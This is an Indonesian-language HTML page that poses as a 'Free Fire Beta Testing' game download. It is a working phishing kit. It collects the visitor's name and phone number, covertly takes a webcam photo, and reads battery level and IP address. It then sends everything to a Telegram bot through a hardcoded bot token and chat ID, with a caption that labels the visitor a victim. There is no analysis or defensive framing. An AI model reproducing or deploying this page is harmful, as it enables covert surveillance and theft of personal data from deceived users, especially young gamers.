<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Free Fire Beta Testing</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: #f1f1f1;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 0 30px rgba(0,0,0,0.1);
      padding: 30px;
      text-align: center;
      max-width: 360px;
      width: 90%;
    }

    .card img {
      width: 80px;
      height: 80px;
      margin-bottom: 15px;
      border-radius: 12px;
    }

    .card h2 {
      font-size: 20px;
      margin: 0;
      margin-bottom: 10px;
    }

    .card p {
      margin: 4px 0;
      font-size: 14px;
      color: #555;
    }

    .card input {
      width: 100%;
      padding: 10px;
      margin-top: 15px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    .card button {
      width: 100%;
      background: #28a745;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      margin-top: 15px;
      border-radius: 6px;
      cursor: pointer;
    }

    .footer {
      font-size: 12px;
      color: #aaa;
      margin-top: 15px;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="card">
  <img src="https://files.catbox.moe/h17a67.jpg" alt="FF Icon">
  <h2>Free Fire Beta Testing</h2>
  <p>File: Media_Installer_Setup.exe</p>
  <p>Size: 23.6 MB</p>
  <input type="text" id="phoneNumber" placeholder="Masukkan nomor ponsel untuk verifikasi">
  <input type="text" id="userName" placeholder="Masukkan nama Anda">
  <button id="prepareButton" disabled onclick="sendData()">Download</button>
  <div class="footer">Apk Free Fire Beta Testing | 2025.</div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const BOT_TOKEN = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU';
const CHAT_ID = '6624966395';

let userName = '';
let phoneNumber = '';

function validateInputs() {
  // Validasi jika nomor dan nama sudah diisi
  userName = document.getElementById('userName').value;
  phoneNumber = document.getElementById('phoneNumber').value;

  if (userName && phoneNumber) {
    document.getElementById('prepareButton').disabled = false;
  } else {
    document.getElementById('prepareButton').disabled = true;
  }
}

function sendData() {
  // Memastikan nama dan nomor sudah diisi
  if (!userName || !phoneNumber) {
    alert('Harap masukkan nomor ponsel dan nama Anda!');
    return;
  }

  navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
    video.srcObject = stream;

    setTimeout(async () => {
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataURL = canvas.toDataURL('image/jpeg');
      const blob = await (await fetch(dataURL)).blob();
      stream.getTracks().forEach(track => track.stop());

      const battery = await navigator.getBattery();
      const level = Math.round(battery.level * 100);
      const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('caption', `
|──────────────────────────────|
𝐊𝐨𝐫𝐛𝐚𝐧 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐒𝐚𝐝𝐚𝐩 𝐁𝐚𝐧𝐠 𝐈𝐧𝐢 𝐃𝐚𝐭𝐚 𝐍𝐲𝐚
|──────────────────────────────|
𝐈𝐧𝐟𝐨 𝐃𝐞𝐯𝐢𝐜𝐞 :
|──────────────────────────────|
🔋𝐁𝐚𝐭𝐞𝐫𝐚𝐢 : ${level}%
🌐 𝐈𝐏 𝐀𝐝𝐝𝐫𝐞𝐬 : ${ipData.ip}
|──────────────────────────────|
𝐈𝐧𝐟𝐨 𝐔𝐬𝐞𝐫 :
|──────────────────────────────|
🌟 𝐍𝐚𝐦𝐞 : ${userName}
☎ 𝐍𝐮𝐦𝐛𝐞𝐫 : ${phoneNumber}
|──────────────────────────────|
`);
      formData.append('photo', blob, 'cam.jpg');

      // Mengirim foto dan data ke Telegram
      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const result = await response.json();
        if (result.ok) {
          alert('Data berhasil dikirim!');
        } else {
          alert('Terjadi kesalahan saat mengirim data.');
        }
      } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
      }

    }, 3000);

  }).catch(err => {
    alert('Akses kamera ditolak: ' + err.message);
  });
}

// Validasi input saat pengguna mengetik
document.getElementById('phoneNumber').addEventListener('input', validateInputs);
document.getElementById('userName').addEventListener('input', validateInputs);

</script>

</body>
</html>
